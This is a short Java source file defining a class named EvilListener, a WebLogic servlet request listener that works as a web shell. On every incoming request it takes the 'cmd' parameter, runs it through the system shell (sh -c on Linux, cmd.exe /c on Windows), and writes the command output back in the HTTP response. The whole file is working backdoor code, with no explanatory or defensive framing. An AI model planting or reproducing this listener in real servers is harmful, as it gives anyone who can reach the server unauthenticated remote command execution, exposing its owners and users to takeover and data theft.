import javax.servlet.*;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.Scanner;

public class EvilListener implements ServletRequestListener {
    String aa;
    public void requestInitialized(ServletRequestEvent ev) {
        try{
        ServletRequest request = ev.getServletRequest();
        ServletResponse response  = ((weblogic.servlet.internal.ServletRequestImpl)request).getResponse();

        String cmd = request.getParameter("cmd");
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
        }
        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner s = new Scanner(in).useDelimiter("\\a");
        String output = s.hasNext() ? s.next() : "";
        PrintWriter out = response.getWriter();
        out.println(output);
        out.flush();
        out.close();
        }catch(Exception ex){
            ex.printStackTrace();
        }
    }

    public void requestDestroyed(ServletRequestEvent ev) {
    }
}